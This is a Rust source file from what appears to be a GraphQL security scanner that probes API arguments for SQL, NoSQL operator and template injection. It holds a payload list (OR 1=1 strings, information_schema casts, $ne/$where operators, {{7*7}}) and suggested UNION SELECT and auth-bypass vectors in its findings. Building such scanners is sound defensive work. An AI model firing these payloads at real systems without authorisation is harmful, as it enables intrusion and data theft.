use crate::audit::targets::{build_nested_value, find_injectable_paths};
use crate::audit::utils::{
    build_operation_query, effective_headers, is_sql_error, is_sql_error_excluding_payload,
};
use std::collections::HashSet;

/// Hasura (and similar) auto-generate a `where` comparison API whose leaf fields are these
/// operators, backed by **parameterized** SQL — not string-concatenation sinks. Probing them
/// for SQLi is pure noise (one bogus hit per operator × per column) and was the single largest
/// false-positive source, so these paths are skipped by default.
const HASURA_COMPARISON_OPS: &[&str] = &[
    "_eq", "_neq", "_in", "_nin", "_gt", "_lt", "_gte", "_lte", "_like", "_nlike", "_ilike",
    "_nilike", "_similar", "_nsimilar", "_regex", "_iregex", "_nregex", "_niregex", "_is_null",
    "_contains", "_contained_in", "_has_key", "_has_keys_any", "_has_keys_all",
];

/// True when the leaf segment of a dotted argument path is a Hasura comparison operator
/// (`where.user.id._eq` → leaf `_eq`), i.e. a parameterized filter rather than a raw-SQL sink.
fn is_parameterized_filter_path(path: &str) -> bool {
    match path.rsplit('.').next() {
        Some(leaf) => HASURA_COMPARISON_OPS.contains(&leaf),
        None => false,
    }
}
use crate::config::AppConfig;
use crate::transport::Transport;
use crate::types::{AffectedLocation, Confidence, EvidenceLevel, Finding, FindingStatus, GqlSchema, Severity};
use reqwest::Client;
use std::collections::HashMap;
use colored::Colorize;

pub async fn probe_sqli(
    schema: &GqlSchema,
    url: &str,
    client: &Client,
    extra_headers: &[String],
    rate_limit_ms: u64,
    evasion_level: u8,
    config: &AppConfig,
    transport: Transport,
    ctx: &crate::audit::targets::ScopeCtx<'_>,
    confirmed: &mut Vec<Finding>,
    _unconfirmed: &mut Vec<Finding>,
) -> Result<(), String> {
    let query_name = schema.query_type.as_ref().map(|q| q.name.as_str());
    let mutation_name = schema.mutation_type.as_ref().map(|m| m.name.as_str());

    let mut targets = Vec::new();
    let mut skipped_parameterized = 0usize;
    for (op, root) in [("query", query_name), ("mutation", mutation_name)] {
        for field in schema.fields_for_type(root) {
            if let Some(args) = &field.args {
                for arg in args {
                    if let Some(at) = &arg.arg_type {
                        // Find all injectable paths (including nested fields in InputObjects)
                        let paths = find_injectable_paths(schema, at, &arg.name, crate::audit::targets::SQLI_LEAF_SCALARS);
                        for path in paths {
                            // Skip Hasura-style comparison-operator leaves (`where...._eq`): they are
                            // parameterized filters, not raw-SQL sinks — probing them is noise.
                            if is_parameterized_filter_path(&path) {
                                skipped_parameterized += 1;
                                continue;
                            }
                            targets.push((op, root.unwrap_or("?"), field, arg, path));
                        }
                    }
                }
            }
        }
    }

    if skipped_parameterized > 0 {
        crate::progress::persistent(&format!(
            "  {} sql-injection: skipped {} parameterized comparison-operator arg(s) (Hasura-style `where._eq/_ilike/...` — parameterized filters, not injection sinks)",
            "→".blue(), skipped_parameterized
        ));
    }

    // Focus / rank (SQL name affinity first, then passive severity) / cap before probing.
    let targets = crate::audit::targets::scope_targets_prioritized(
        targets,
        ctx.sev_index,
        ctx.scope,
        |t| (t.1.to_string(), t.2.name.clone()),
        |t| crate::audit::targets::sqli_affinity(
            &format!("{} {} {}", t.2.name, t.3.name, t.4),
        ),
    );

    let headers = effective_headers(extra_headers, None, false);
    
    // Mix of SQL, NoSQL, and Template Injection payloads
    let mut internal_payloads = vec![
        // Classic SQL
        (serde_json::json!("'"), "'".to_string()),
        (serde_json::json!("''"), "''".to_string()),
        (serde_json::json!("' -- -"), "' -- - (MySQL/MariaDB)".to_string()),
        (serde_json::json!("') OR 1=1--"), "') OR 1=1--".to_string()),
        (serde_json::json!("\" OR 1=1--"), "\" OR 1=1--".to_string()),
        (serde_json::json!("0 OR 1=1"), "0 OR 1=1 (Numeric)".to_string()),
        
        // NoSQL / MongoDB
        (serde_json::json!({ "$ne": null }), "{\"$ne\": null}".to_string()),
        (serde_json::json!({ "$gt": "" }), "{\"$gt\": \"\"}".to_string()),
        (serde_json::json!({ "$regex": ".*" }), "{\"$regex\": \".*\"}".to_string()),
        (serde_json::json!({ "$where": "sleep(5000)" }), "{\"$where\": \"sleep(5000)\"}".to_string()),
        
        // Template Injection (SSTI)
        (serde_json::json!("{{7*7}}"), "{{7*7}} (SSTI)".to_string()),
        (serde_json::json!("${7*7}"), "${7*7} (SSTI)".to_string()),
        (serde_json::json!("<%= 7*7 %>"), "<%= 7*7 %> (SSTI)".to_string()),

        // PostgreSQL Specific
        (serde_json::json!("' AND 1=(SELECT COUNT(*) FROM users); --"), "PostgreSQL COUNT Error".to_string()),
        (serde_json::json!("' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INT)--"), "PostgreSQL Type Cast Error".to_string()),

        // Polyglots / HTB Specific
        (serde_json::json!("' || 1==1//"), "' || 1==1//".to_string()),
        (serde_json::json!("admin' || '1'=='1"), "admin' || '1'=='1'".to_string()),
    ];

    // Add custom payloads from config
    for cp in &config.audit.custom_payloads {
        let val = serde_json::from_str(cp).unwrap_or(serde_json::Value::String(cp.clone()));
        internal_payloads.push((val, cp.clone()));
    }

    // Collapse: once a `root.field` is confirmed, don't re-report (or re-probe) its other
    // argument paths — one finding per field instead of one per operator/column.
    let mut confirmed_fields: HashSet<(String, String)> = HashSet::new();

    'targets: for (op, root, field, arg, path) in targets {
        let is_mutation = op == "mutation";
        if confirmed_fields.contains(&(root.to_string(), field.name.clone())) {
            continue;
        }
        // Transient (in-place, TTY-only) so per-target progress doesn't scroll-spam
        // and stays clean when piped / in --format json.
        crate::progress::transient(&format!("  {} Testing injection on {}.{}({})...", "→".cyan(), root, field.name, path));

        // Baseline: Send a dummy value first
        if !ctx.budget.try_consume() { break 'targets; }
        let dummy_val = serde_json::Value::String("INTROSPECTRE_DUMMY_123".to_string());
        let mut dummy_overrides = HashMap::new();
        dummy_overrides.insert(arg.name.clone(), build_nested_value(&path, &arg.name, dummy_val));
        let dummy_gql = build_operation_query(schema, op, field, &dummy_overrides, &config.audit.seeds, false);
        let dummy_resp = crate::audit::utils::post_graphql_ext(client, url, &headers, &dummy_gql.query, Some(dummy_gql.variables.clone()), rate_limit_ms, evasion_level, transport, is_mutation).await?;

        // Baseline differential: if a plain dummy value ALREADY yields a database-engine error,
        // this argument rejects any malformed input (type coercion, permission, validation) and
        // is not an injection signal — skip error-based confirmation for it entirely.
        let baseline_db_err = is_sql_error(&dummy_resp.errors_text);
        let baseline_ok = dummy_resp.errors_text.trim().is_empty();

        // --- Blind (error-suppressed) SQL injection: quote-balance differential ---
        // When the baseline (a benign string) succeeds, an odd `'` that BREAKS the query while a
        // balanced `''` RECOVERS it is a signature of a single-quote SQL string context — proof of
        // injection even when the server hides the database error text (e.g. a generic 500). The
        // ok→break→recover transition is specific: a plain input validator errors on both `'` and
        // `''`, and a parameterized backend (Hasura) errors on neither, so neither yields a hit.
        if baseline_ok && ctx.budget.try_consume() {
            let mut single_ov = HashMap::new();
            single_ov.insert(arg.name.clone(), build_nested_value(&path, &arg.name, serde_json::json!("'")));
            let single_gql = build_operation_query(schema, op, field, &single_ov, &config.audit.seeds, false);
            let single_resp = crate::audit::utils::post_graphql_ext(client, url, &headers, &single_gql.query, Some(single_gql.variables), rate_limit_ms, evasion_level, transport, is_mutation).await?;
            let single_broke = !single_resp.errors_text.trim().is_empty();
            if single_broke && ctx.budget.try_consume() {
                let mut double_ov = HashMap::new();
                double_ov.insert(arg.name.clone(), build_nested_value(&path, &arg.name, serde_json::json!("''")));
                let double_gql = build_operation_query(schema, op, field, &double_ov, &config.audit.seeds, false);
                let double_resp = crate::audit::utils::post_graphql_ext(client, url, &headers, &double_gql.query, Some(double_gql.variables), rate_limit_ms, evasion_level, transport, is_mutation).await?;
                let double_ok = double_resp.errors_text.trim().is_empty();
                if double_ok {
                    confirmed_fields.insert((root.to_string(), field.name.clone()));
                    confirmed.push(Finding {
                        id: "sql-injection-blind",
                        severity: Severity::High,
                        title: "Blind SQL Injection Confirmed (error-differential)",
                        description: format!(
                            "### Analysis\n\
                             The argument is concatenated into a single-quoted SQL string context. A lone `'` \
                             breaks the query (server error) while a balanced `''` restores normal execution — \
                             a definitive injection signature that holds even though the server suppresses the \
                             raw database error message.\n\n\
                             ### Evidence (quote-balance differential)\n\
                             - **Argument Path**: `{}` in `{}.{}`\n\
                             - Benign value → success\n\
                             - `'` (odd quote) → error / broken query\n\
                             - `''` (balanced quote) → success again",
                            path, root, field.name
                        ),
                        affected: vec![AffectedLocation::Argument(root.into(), field.name.clone(), path.clone())],
                        remediation: "Use parameterized queries / prepared statements or an ORM — never concatenate user input into SQL. Confirm/exploit with a boolean pair (`' OR '1'='1` vs `' AND '1'='2`) or sqlmap; error text being hidden does not make the injection safe.",
                        first_step: Some(format!("Send `{}` = `'` (expect an error) then `''` (expect success) and compare.", path)),
                        references: vec!["CWE-89: SQL Injection", "OWASP API8: Injection"],
                        status: FindingStatus::Confirmed,
                        confidence: Confidence::Confirmed,
                        evidence_level: EvidenceLevel::Executed,
                        poc: Some(single_gql.query),
                    });
                    continue 'targets;
                }
            }
        }

        for (payload_val, payload_str) in &internal_payloads {
            // Raw injected string, for the reflection guard (so an echoed payload can't self-match).
            let injected_raw = match payload_val {
                serde_json::Value::String(s) => s.clone(),
                other => other.to_string(),
            };
            // 1. Variable-based Test
            if !ctx.budget.try_consume() { break 'targets; }
            let mut overrides = HashMap::new();
            overrides.insert(arg.name.clone(), build_nested_value(&path, &arg.name, payload_val.clone()));

            let gql_op = build_operation_query(schema, op, field, &overrides, &config.audit.seeds, false);
            let resp = crate::audit::utils::post_graphql_ext(client, url, &headers, &gql_op.query, Some(gql_op.variables), rate_limit_ms, evasion_level, transport, is_mutation).await?;

            // 1a. Error-based Detection — only when the payload triggers a database-engine
            // error the dummy baseline did NOT, and the match isn't just our echoed payload.
            if !baseline_db_err && is_sql_error_excluding_payload(&resp.errors_text, &injected_raw) {
                confirmed_fields.insert((root.to_string(), field.name.clone()));
                confirmed.push(Finding {
                    id: "sql-injection",
                    severity: Severity::High,
                    title: "Database Injection (SQL/NoSQL) Confirmed",
                    description: format!(
                        "### Analysis\n\
                         The backend returned a database-specific error message when processing the payload. This indicates direct concatenation or operator interpretation of user input.\n\n\
                         ### Evidence\n\
                         - **Argument Path**: `{}` in `{}.{}`\n\
                         - **Trigger Payload**: `{}`\n\n\
                         **Database Error**:\n```\n{}\n```",
                        path, root, field.name, payload_str, resp.errors_text
                    ),
                    affected: vec![AffectedLocation::Argument(root.into(), field.name.clone(), path.clone())],
                    remediation: "Use parameterized queries or an ORM/ODM that handles sanitization automatically. For NoSQL, ensure input is cast to the expected type and not allowed to contain operator objects.\n\n\
                         Suggested Manual Test Vectors:\n\
                         - `' OR 1=1 -- -` (Auth Bypass)\n\
                         - `' UNION SELECT NULL,NULL -- -` (Data Extraction)\n\
                         - `{\"$ne\": null}` (NoSQL Logic Bypass)\n\
                         - `{\"$where\": \"sleep(5000)\"}` (NoSQL Time-based)",
                    first_step: Some(format!("Try to trigger the same error manually by sending the payload `{}` to the {} field.", payload_str, path)),
                    references: vec!["CWE-89: SQL Injection", "CWE-943: NoSQL Injection", "OWASP API8: Injection"],
                    status: FindingStatus::Confirmed,
                    confidence: Confidence::Confirmed,
                    evidence_level: EvidenceLevel::Executed,
                    poc: Some(gql_op.query),
                });
                break;
            }

            // 1b. SSTI Detection (Look for reflected '49')
            if payload_str.contains("7*7") && resp.raw_text.contains("49") && !dummy_resp.raw_text.contains("49") {
                 confirmed_fields.insert((root.to_string(), field.name.clone()));
                 confirmed.push(Finding {
                    id: "ssti",
                    severity: Severity::High,
                    title: "Server-Side Template Injection (SSTI) Confirmed",
                    description: format!(
                        "Argument Path: `{}` in `{}.{}`\n\
                         Trigger Payload: `{}`\n\n\
                         Evidence: The payload `7*7` was evaluated on the server and the result `49` was reflected in the response body.\n\n\
                         Analysis: This indicates the argument is passed directly to a template engine (e.g. Jinja2, ERB, Mako) which evaluates expressions.",
                        path, root, field.name, payload_str
                    ),
                    affected: vec![AffectedLocation::Argument(root.into(), field.name.clone(), path.clone())],
                    remediation: "Never allow user input to be passed to a template engine's render or evaluate function. Use safe, sandboxed template contexts or avoid dynamic templates for user-controlled data.",
                    first_step: Some(format!("Send the payload `{}` and verify that '49' appears in the response body.", payload_str)),
                    references: vec!["CWE-94: Improper Control of Generation of Code", "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"],
                    status: FindingStatus::Confirmed,
                    confidence: Confidence::Confirmed,
                    evidence_level: EvidenceLevel::Executed,
                    poc: Some(gql_op.query),
                });
                break;
            }

            // 1c. Boolean-based / Data Leakage Detection (NoSQL specific)
            if (payload_str.contains("$") || payload_str.contains("OR")) && !resp.data.is_none() && resp.data != dummy_resp.data {
                 // Check if it's a non-null vs null situation or different data
                 if dummy_resp.data.is_none() || dummy_resp.data.as_ref().map(|d| d.is_null()).unwrap_or(true) {
                    confirmed_fields.insert((root.to_string(), field.name.clone()));
                    confirmed.push(Finding {
                        id: "blind-injection",
                        severity: Severity::Critical,
                        title: "Blind Injection Confirmed (Data Leak)",
                        description: format!(
                            "### Analysis\n\
                             The argument is vulnerable to blind injection. The injected payload bypassed a query filter or logic check, allowing data to be leaked that is normally inaccessible.\n\n\
                             ### Evidence\n\
                             - **Argument Path**: `{}` in `{}.{}`\n\
                             - **Trigger Payload**: `{}`\n\
                             - **Dummy Response**: Null/Error\n\
                             - **Injection Response**: Valid Data (Success)",
                            path, root, field.name, payload_str
                        ),
                        affected: vec![AffectedLocation::Argument(root.into(), field.name.clone(), path.clone())],
                        remediation: "Strictly validate all input types. Never allow user input to be passed as an object to a NoSQL query or concatenated into SQL. Ensure all inputs are properly escaped and typed.",
                        first_step: Some(format!("Compare the response of a normal query with the response when sending `{}` as the value for {}.", payload_str, path)),
                        references: vec!["CWE-943: NoSQL Injection", "CWE-89: SQL Injection", "OWASP API8: Injection"],
                        status: FindingStatus::Confirmed,
                        confidence: Confidence::Confirmed,
                        evidence_level: EvidenceLevel::Executed,
                        poc: Some(gql_op.query),
                    });
                        break;
                 }
            }

            // 2. Inlined-query Test (Some resolvers fail only when inlined)
            if !ctx.budget.try_consume() { break 'targets; }
            let mut inlined_overrides = HashMap::new();
            let nested_val = build_nested_value(&path, &arg.name, payload_val.clone());
            inlined_overrides.insert(arg.name.clone(), json_to_graphql(&nested_val));

            let inlined_call = crate::audit::utils::build_field_call(schema, field, &inlined_overrides, &config.audit.seeds, false);
            let inlined_query = format!("{} {{ {} }}", op, inlined_call);

            let resp = crate::audit::utils::post_graphql_ext(client, url, &headers, &inlined_query, None, rate_limit_ms, evasion_level, transport, is_mutation).await?;
            if !baseline_db_err && is_sql_error_excluding_payload(&resp.errors_text, &injected_raw) {
                confirmed_fields.insert((root.to_string(), field.name.clone()));
                confirmed.push(Finding {
                    id: "sql-injection-inline",
                    severity: Severity::High,
                    title: "Database Injection (Inlined) Confirmed",
                    description: format!(
                        "### Analysis\n\
                         The backend returned a database error when the payload was embedded directly in the query string. This indicates inconsistent sanitization logic between Inlined values and Variables.\n\n\
                         ### Evidence\n\
                         - **Argument Path**: `{}` in `{}.{}`\n\
                         - **Trigger Payload**: `{}` (Inlined)\n\n\
                         **Database Error**:\n```\n{}\n```",
                        path, root, field.name, payload_str, resp.errors_text
                    ),
                    affected: vec![AffectedLocation::Argument(root.into(), field.name.clone(), path.clone())],
                    remediation: "Use parameterized queries/variables instead of inlining values in query strings. Ensure all inputs are strictly typed and sanitized.",
                    first_step: Some(format!("Send the inlined PoC query manually and observe the database error response.")),
                    references: vec!["CWE-89: SQL Injection", "OWASP API8: Injection"],
                    status: FindingStatus::Confirmed,
                    confidence: Confidence::Confirmed,
                    evidence_level: EvidenceLevel::Executed,
                    poc: Some(inlined_query),
                });
                break;
            }
        }
    }

    // --- NoSQL operator injection (custom-scalar / JSON args) ---
    // String args can't carry an operator object, so `$`-operator injection lives on args typed as a
    // custom scalar (JSON/JSONObject/…). Detect it with a benign-vs-operator DIFFERENTIAL: a benign
    // literal returns one result; an operator object the backend interprets ({"$ne":null}/…) returns a
    // more-permissive result (data the literal did not match). A parameterized/typed backend either
    // rejects the object (error) or treats it as a literal (same as benign) — so no false confirm.
    const STD_SCALARS: &[&str] = &["String", "ID", "Int", "Float", "Boolean"];
    let mut nosql_targets = Vec::new();
    for (op, root) in [("query", query_name), ("mutation", mutation_name)] {
        for field in schema.fields_for_type(root) {
            if let Some(args) = &field.args {
                for arg in args {
                    if let Some(tn) = arg.arg_type.as_ref().and_then(|t| t.unwrap_type_name()) {
                        if STD_SCALARS.contains(&tn.as_str()) {
                            continue;
                        }
                        let is_custom_scalar = schema
                            .find_type(&tn)
                            .map_or(false, |t| t.kind.as_deref() == Some("SCALAR"));
                        if is_custom_scalar {
                            nosql_targets.push((op, root.unwrap_or("?"), field, arg));
                        }
                    }
                }
            }
        }
    }
    let nosql_targets = crate::audit::targets::scope_targets_prioritized(
        nosql_targets,
        ctx.sev_index,
        ctx.scope,
        |t| (t.1.to_string(), t.2.name.clone()),
        |t| crate::audit::targets::name_affinity(
            &format!("{} {}", t.2.name, t.3.name),
            &["token", "password", "filter", "where", "query", "auth", "secret", "user", "id"],
        ),
    );

    let nosql_payloads = [
        serde_json::json!({"$ne": null}),
        serde_json::json!({"$gt": ""}),
        serde_json::json!({"$regex": ".*"}),
        serde_json::json!({"$ne": "introspectre-no-such-value"}),
    ];

    'nosql: for (op, root, field, arg) in nosql_targets {
        if confirmed_fields.contains(&(root.to_string(), field.name.clone())) {
            continue;
        }
        let is_mutation = op == "mutation";
        crate::progress::transient(&format!(
            "  {} Testing NoSQL operator injection on {}.{}({})...",
            "→".cyan(), root, field.name, arg.name
        ));

        // Benign baseline: a plain string value the resolver treats as a literal.
        if !ctx.budget.try_consume() { break 'nosql; }
        let mut benign_ov = HashMap::new();
        benign_ov.insert(arg.name.clone(), serde_json::Value::String("introspectre_benign_value".to_string()));
        let benign_gql = build_operation_query(schema, op, field, &benign_ov, &config.audit.seeds, false);
        let benign_resp = crate::audit::utils::post_graphql_ext(client, url, &headers, &benign_gql.query, Some(benign_gql.variables), rate_limit_ms, evasion_level, transport, is_mutation).await?;
        // Need a clean baseline: if the benign request errors, no reliable differential.
        if !benign_resp.errors_text.trim().is_empty() {
            continue;
        }

        for payload in &nosql_payloads {
            if !ctx.budget.try_consume() { break 'nosql; }
            let mut ov = HashMap::new();
            ov.insert(arg.name.clone(), payload.clone());
            let gql = build_operation_query(schema, op, field, &ov, &config.audit.seeds, false);
            let resp = crate::audit::utils::post_graphql_ext(client, url, &headers, &gql.query, Some(gql.variables), rate_limit_ms, evasion_level, transport, is_mutation).await?;

            // The operator object must be ACCEPTED (no errors), return a DIFFERENT result than the
            // benign literal, and that result must carry meaningful data (the operator broadened the
            // query and matched records the literal did not).
            let accepted = resp.errors_text.trim().is_empty();
            let differs = resp.data != benign_resp.data;
            let meaningful = resp.data.as_ref().map_or(false, has_meaningful_data);
            if accepted && differs && meaningful {
                confirmed_fields.insert((root.to_string(), field.name.clone()));
                confirmed.push(Finding {
                    id: "nosql-injection",
                    severity: Severity::Critical,
                    title: "NoSQL Operator Injection Confirmed",
                    description: format!(
                        "### Analysis\n\
                         The `{arg}` argument (a JSON/custom-scalar type) is passed unvalidated into a NoSQL \
                         query. Sending a MongoDB operator object made the query return a broader result than a \
                         benign literal value — the operator was interpreted by the database, confirming NoSQL \
                         operator injection (auth bypass / data exfiltration).\n\n\
                         ### Evidence (benign vs. operator differential)\n\
                         - **Argument**: `{root}.{fname}({arg})`\n\
                         - **Operator payload**: `{payload}`\n\
                         - Benign literal → one result; operator object → a different, non-empty result.",
                        arg = arg.name, root = root, fname = field.name, payload = payload
                    ),
                    affected: vec![AffectedLocation::Argument(root.into(), field.name.clone(), arg.name.clone())],
                    remediation: "Never pass client-supplied JSON/objects into a database query. Coerce inputs to the expected scalar type and reject query-operator keys (`$ne`, `$gt`, `$regex`, `$where`, …).",
                    first_step: Some(format!("Send `{}` = a normal value, then `{}`, and compare the responses.", arg.name, payload)),
                    references: vec!["CWE-943: NoSQL Injection", "OWASP API8: Injection"],
                    status: FindingStatus::Confirmed,
                    confidence: Confidence::Confirmed,
                    evidence_level: EvidenceLevel::Executed,
                    poc: Some(gql.query),
                });
                break;
            }
        }
    }

    Ok(())
}

/// True if a GraphQL `data` value carries at least one "meaningful" leaf — a non-empty string, a
/// number, `true`, or a non-empty list — i.e. the query actually returned something (not all nulls).
fn has_meaningful_data(v: &serde_json::Value) -> bool {
    match v {
        serde_json::Value::Null => false,
        serde_json::Value::Bool(b) => *b,
        serde_json::Value::Number(_) => true,
        serde_json::Value::String(s) => !s.is_empty(),
        serde_json::Value::Array(a) => a.iter().any(has_meaningful_data),
        serde_json::Value::Object(o) => o.values().any(has_meaningful_data),
    }
}

fn json_to_graphql(val: &serde_json::Value) -> String {
    match val {
        serde_json::Value::Null => "null".to_string(),
        serde_json::Value::Bool(b) => b.to_string(),
        serde_json::Value::Number(n) => n.to_string(),
        serde_json::Value::String(s) => format!("\"{}\"", s.replace("\"", "\\\"")),
        serde_json::Value::Array(arr) => {
            let items: Vec<String> = arr.iter().map(json_to_graphql).collect();
            format!("[{}]", items.join(", "))
        }
        serde_json::Value::Object(obj) => {
            let fields: Vec<String> = obj.iter()
                .map(|(k, v)| format!("{}: {}", k, json_to_graphql(v)))
                .collect();
            format!("{{ {} }}", fields.join(", "))
        }
    }
}

